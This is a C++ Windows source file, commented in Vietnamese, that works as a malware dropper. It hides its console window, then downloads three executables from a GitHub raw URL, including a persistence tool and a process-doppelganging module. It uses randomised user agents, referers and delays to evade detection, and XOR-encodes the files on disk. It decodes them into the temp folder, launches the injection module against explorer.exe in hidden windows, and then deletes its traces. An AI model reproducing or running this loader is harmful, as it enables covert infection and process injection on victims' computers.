#include <Windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <ShlObj.h>
#include <TlHelp32.h>
#include <sstream>
#include <vector>
#include <time.h>
#include <random>
#include <algorithm>
#include <cctype>
#include <cwctype>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Advapi32.lib")

// Thêm manifest để yêu cầu quyền admin nếu cần
#pragma comment(linker, "\"/manifestdependency:type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

// Tạo tên ngẫu nhiên cho file
std::wstring GenerateRandomName(int len)
{
    static const wchar_t alphanum[] =
        L"0123456789"
        L"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        L"abcdefghijklmnopqrstuvwxyz";

    std::random_device rd;
    std::mt19937 generator(rd());
    std::uniform_int_distribution<int> distribution(0, sizeof(alphanum) / sizeof(wchar_t) - 2);

    std::wstring result;
    result.reserve(len);
    for (int i = 0; i < len; ++i)
    {
        result += alphanum[distribution(generator)];
    }
    return result;
}

// Mã hóa/giải mã đơn giản với XOR và khóa động
std::vector<BYTE> TransformData(const std::vector<BYTE> &data, const std::vector<BYTE> &key)
{
    std::vector<BYTE> result(data.size());
    for (size_t i = 0; i < data.size(); i++)
    {
        result[i] = data[i] ^ key[i % key.size()];
    }
    return result;
}

// Tạo khóa ngẫu nhiên
std::vector<BYTE> GenerateKey(size_t length)
{
    std::vector<BYTE> key(length);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1, 255);

    for (size_t i = 0; i < length; i++)
    {
        key[i] = static_cast<BYTE>(dis(gen));
    }
    return key;
}

// Kiểm tra xem có đang chạy trong sandbox không (vô hiệu hóa)
bool IsRunningInSandbox()
{
    // Vô hiệu hóa kiểm tra sandbox
    return false;
}

// Kiểm tra các process phân tích (vô hiệu hóa)
bool HasAnalysisTools()
{
    // Vô hiệu hóa kiểm tra công cụ phân tích
    return false;
}

// Hiển thị thông báo lỗi
void ShowError(const wchar_t *message, DWORD errorCode = 0)
{
    wchar_t buffer[1024];
    if (errorCode != 0)
    {
        swprintf_s(buffer, L"%s\nMã lỗi: %d", message, errorCode);
    }
    else
    {
        wcscpy_s(buffer, message);
    }
    MessageBoxW(NULL, buffer, L"Thông báo", MB_OK | MB_ICONINFORMATION);
}

// Hàm tải file từ URL với các biện pháp né tránh
bool DownloadFile(const wchar_t *serverAddress, const wchar_t *filePath, const std::wstring &savePath)
{
    // Kiểm tra nếu file đã tồn tại
    DWORD fileAttrs = GetFileAttributesW(savePath.c_str());
    if (fileAttrs != INVALID_FILE_ATTRIBUTES)
    {
        return true;
    }

    // Trì hoãn ngẫu nhiên để tránh mẫu thời gian cố định
    srand(time(NULL));
    Sleep(500 + (rand() % 1000));

    // Khởi tạo WinInet với user agent ngẫu nhiên
    std::wstring userAgents[] = {
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/96.0.1054.62"};

    int uaIndex = rand() % 5;

    HINTERNET hInternet = InternetOpenW(
        userAgents[uaIndex].c_str(),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0);

    if (!hInternet)
    {
        return false;
    }

    // Timeout cấu hình
    DWORD timeout = 30000 + (rand() % 15000); // 30-45 giây
    InternetSetOptionW(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionW(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionW(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    // Kết nối đến server
    HINTERNET hConnect = InternetConnectW(
        hInternet,
        serverAddress,
        INTERNET_DEFAULT_HTTPS_PORT,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        0);

    if (!hConnect)
    {
        InternetCloseHandle(hInternet);
        return false;
    }

    // Mở HTTP request
    HINTERNET hRequest = HttpOpenRequestW(
        hConnect,
        L"GET",
        filePath,
        NULL,
        NULL,
        NULL,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE,
        0);

    if (!hRequest)
    {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Thêm các header giống browser thật
    std::wstring referers[] = {
        L"https://www.google.com/",
        L"https://www.bing.com/",
        L"https://github.com/",
        L"https://stackoverflow.com/",
        L"https://www.microsoft.com/"};

    int refIndex = rand() % 5;

    std::wstring headers = L"Accept: */*\r\n";
    headers += L"User-Agent: " + userAgents[uaIndex] + L"\r\n";
    headers += L"Accept-Language: en-US,en;q=0.9\r\n";
    headers += L"Referer: " + referers[refIndex] + L"\r\n";

    HttpAddRequestHeadersW(hRequest, headers.c_str(), -1L, HTTP_ADDREQ_FLAG_ADD);

    // Gửi request
    BOOL result = HttpSendRequestW(
        hRequest,
        NULL,
        0,
        NULL,
        0);

    if (!result)
    {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Kiểm tra HTTP status code
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    if (!HttpQueryInfoW(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusCodeSize, NULL))
    {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    if (statusCode != 200)
    {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Tạo file tạm thời với tên ngẫu nhiên
    wchar_t temp_path[MAX_PATH];
    GetTempPathW(MAX_PATH, temp_path);
    std::wstring temp_filename = GenerateRandomName(12) + L".tmp";
    std::wstring temp_file = std::wstring(temp_path) + temp_filename;

    // Tạo file để lưu
    HANDLE hFile = CreateFileW(
        temp_file.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Đọc dữ liệu vào bộ nhớ trước
    std::vector<BYTE> fileData;
    BYTE buffer[8192];
    DWORD bytesRead = 0;
    const DWORD maxSize = 100 * 1024 * 1024; // Giới hạn 100MB

    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
    {
        if (fileData.size() + bytesRead > maxSize)
            break;

        fileData.insert(fileData.end(), buffer, buffer + bytesRead);
    }

    // Mã hóa dữ liệu với khóa ngẫu nhiên
    std::vector<BYTE> key = GenerateKey(16); // Tạo khóa 16 byte
    std::vector<BYTE> encodedData = TransformData(fileData, key);

    // Ghi dữ liệu đã mã hóa
    DWORD bytesWritten = 0;
    if (!WriteFile(hFile, encodedData.data(), static_cast<DWORD>(encodedData.size()), &bytesWritten, NULL) ||
        bytesWritten != encodedData.size())
    {
        CloseHandle(hFile);
        DeleteFileW(temp_file.c_str());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Thêm khóa vào cuối file
    if (!WriteFile(hFile, key.data(), static_cast<DWORD>(key.size()), &bytesWritten, NULL) ||
        bytesWritten != key.size())
    {
        CloseHandle(hFile);
        DeleteFileW(temp_file.c_str());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Ghi kích thước khóa (16 byte) vào cuối file
    DWORD keySize = static_cast<DWORD>(key.size());
    if (!WriteFile(hFile, &keySize, sizeof(DWORD), &bytesWritten, NULL) ||
        bytesWritten != sizeof(DWORD))
    {
        CloseHandle(hFile);
        DeleteFileW(temp_file.c_str());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Đóng handles
    CloseHandle(hFile);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // Di chuyển đến vị trí cuối cùng
    BOOL moved = MoveFileExW(temp_file.c_str(), savePath.c_str(), MOVEFILE_REPLACE_EXISTING);
    if (!moved)
    {
        DeleteFileW(temp_file.c_str());
        return false;
    }

    // Trì hoãn thêm để không có mẫu thời gian cố định
    Sleep(100 + (rand() % 200));

    return true;
}

// Hàm giải mã file đã tải
bool DecryptFile(const std::wstring &encryptedPath, const std::wstring &decryptedPath)
{
    // Mở file đã mã hóa
    HANDLE hEncFile = CreateFileW(
        encryptedPath.c_str(),
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hEncFile == INVALID_HANDLE_VALUE)
        return false;

    // Lấy kích thước file
    DWORD fileSize = GetFileSize(hEncFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize <= sizeof(DWORD) + 16) // Kích thước tối thiểu
    {
        CloseHandle(hEncFile);
        return false;
    }

    // Đọc kích thước khóa từ cuối file
    DWORD keySize;
    DWORD bytesRead;
    SetFilePointer(hEncFile, fileSize - sizeof(DWORD), NULL, FILE_BEGIN);
    if (!ReadFile(hEncFile, &keySize, sizeof(DWORD), &bytesRead, NULL) || bytesRead != sizeof(DWORD))
    {
        CloseHandle(hEncFile);
        return false;
    }

    // Đọc khóa
    std::vector<BYTE> key(keySize);
    SetFilePointer(hEncFile, fileSize - sizeof(DWORD) - keySize, NULL, FILE_BEGIN);
    if (!ReadFile(hEncFile, key.data(), keySize, &bytesRead, NULL) || bytesRead != keySize)
    {
        CloseHandle(hEncFile);
        return false;
    }

    // Đọc dữ liệu mã hóa
    DWORD encDataSize = fileSize - sizeof(DWORD) - keySize;
    std::vector<BYTE> encData(encDataSize);
    SetFilePointer(hEncFile, 0, NULL, FILE_BEGIN);
    if (!ReadFile(hEncFile, encData.data(), encDataSize, &bytesRead, NULL) || bytesRead != encDataSize)
    {
        CloseHandle(hEncFile);
        return false;
    }

    CloseHandle(hEncFile);

    // Giải mã dữ liệu
    std::vector<BYTE> decryptedData = TransformData(encData, key);

    // Ghi dữ liệu giải mã
    HANDLE hDecFile = CreateFileW(
        decryptedPath.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hDecFile == INVALID_HANDLE_VALUE)
        return false;

    DWORD bytesWritten;
    BOOL success = WriteFile(hDecFile, decryptedData.data(), static_cast<DWORD>(decryptedData.size()), &bytesWritten, NULL);
    CloseHandle(hDecFile);

    return success && bytesWritten == decryptedData.size();
}

// Set file attributes
bool SetFileAttrs(const std::wstring &path)
{
    return SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
}

// Thu nhỏ console window
void MinimizeConsoleWindow()
{
    HWND hWnd = GetConsoleWindow();
    if (hWnd != NULL)
    {
        ShowWindow(hWnd, SW_MINIMIZE);
    }
}

// Main function
int main(int argc, char *argv[])
{
    // Thu nhỏ cửa sổ console ngay lập tức
    MinimizeConsoleWindow();

    // Ẩn cửa sổ console
    FreeConsole();

    // Thêm độ trễ ngẫu nhiên
    srand(time(NULL));
    Sleep(100 + (rand() % 200));

    // Lấy đường dẫn thư mục Temp
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);

    // Tạo đường dẫn với tên ngẫu nhiên trong thư mục Temp
    std::wstring helperPath = std::wstring(tempPath) + GenerateRandomName(8) + L".dat";
    std::wstring modulePath = std::wstring(tempPath) + GenerateRandomName(8) + L".dat";
    std::wstring loaderPath = std::wstring(tempPath) + GenerateRandomName(8) + L".dat";

    // Đường dẫn cho file giải mã - sử dụng đúng tên file gốc
    std::wstring decModulePath = std::wstring(tempPath) + L"process_doppelganging.exe";
    std::wstring decHelperPath = std::wstring(tempPath) + L"persistence_obfuscated.exe";
    std::wstring decLoaderPath = std::wstring(tempPath) + L"MinLoader.exe";

    // GitHub URLs - Sử dụng URL gián tiếp hơn (ví dụ: domain khác)
    const wchar_t *serverAddress = L"raw.githubusercontent.com";

    // 1. Tải helper file
    const wchar_t *helperFilePath = L"/fuondai/process_doppelganging/main/exe/persistence_obfuscated.exe";
    if (!DownloadFile(serverAddress, helperFilePath, helperPath))
    {
        return 0;
    }

    // 2. Tải loader file
    const wchar_t *loaderFilePath = L"/fuondai/process_doppelganging/main/exe/MinLoader.exe";
    if (!DownloadFile(serverAddress, loaderFilePath, loaderPath))
    {
        return 0;
    }

    // 3. Tải module file
    const wchar_t *moduleFilePath = L"/fuondai/process_doppelganging/main/exe/process_doppelganging.exe";
    if (!DownloadFile(serverAddress, moduleFilePath, modulePath))
    {
        return 0;
    }

    // Giải mã các file đã tải
    if (!DecryptFile(helperPath, decHelperPath) ||
        !DecryptFile(modulePath, decModulePath) ||
        !DecryptFile(loaderPath, decLoaderPath))
    {
        return 0;
    }

    // Xóa các file mã hóa
    DeleteFileW(helperPath.c_str());
    DeleteFileW(modulePath.c_str());
    DeleteFileW(loaderPath.c_str());

    // Kiểm tra sự tồn tại của file process module
    if (GetFileAttributesW(decModulePath.c_str()) == INVALID_FILE_ATTRIBUTES)
    {
        return 0;
    }

    // Chỉ nhắm vào explorer.exe
    std::wstring targetProcess = L"explorer.exe";

    // Thử phương pháp 1: Chạy trực tiếp
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&pi, sizeof(pi));

    // Chuẩn bị command line - sử dụng tên file đúng
    std::wstring cmdLine = decModulePath + L" " + targetProcess;

    wchar_t *cmdLineBuffer = new wchar_t[cmdLine.length() + 1];
    wcscpy_s(cmdLineBuffer, cmdLine.length() + 1, cmdLine.c_str());

    // Thực thi
    BOOL success = CreateProcessW(
        NULL,
        cmdLineBuffer,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        tempPath,
        &si,
        &pi);

    bool executionSuccess = false;

    if (success)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        executionSuccess = true;
    }
    else
    {
        // Thử phương pháp 2: Sử dụng CreateProcess với một command line khác
        std::wstring altCmdLine = L"\"" + decModulePath + L"\" \"" + targetProcess + L"\"";

        wchar_t *altCmdLineBuffer = new wchar_t[altCmdLine.length() + 1];
        wcscpy_s(altCmdLineBuffer, altCmdLine.length() + 1, altCmdLine.c_str());

        success = CreateProcessW(
            NULL,
            altCmdLineBuffer,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            tempPath,
            &si,
            &pi);

        if (success)
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            executionSuccess = true;
            delete[] altCmdLineBuffer;
        }
        else
        {
            delete[] altCmdLineBuffer;

            // Thử phương pháp 3: Chạy thông qua MinLoader
            std::wstring loaderCmdLine = decLoaderPath + L" " + decModulePath + L" " + targetProcess;

            wchar_t *loaderCmdLineBuffer = new wchar_t[loaderCmdLine.length() + 1];
            wcscpy_s(loaderCmdLineBuffer, loaderCmdLine.length() + 1, loaderCmdLine.c_str());

            success = CreateProcessW(
                NULL,
                loaderCmdLineBuffer,
                NULL,
                NULL,
                FALSE,
                CREATE_NO_WINDOW,
                NULL,
                tempPath,
                &si,
                &pi);

            if (success)
            {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                executionSuccess = true;
            }

            delete[] loaderCmdLineBuffer;
        }
    }

    delete[] cmdLineBuffer;

    // Xóa các file để giảm dấu vết
    if (executionSuccess)
    {
        Sleep(500);
        DeleteFileW(decModulePath.c_str());
        DeleteFileW(decHelperPath.c_str());
        DeleteFileW(decLoaderPath.c_str());
    }

    // Thoát nhanh chóng
    return 0;
}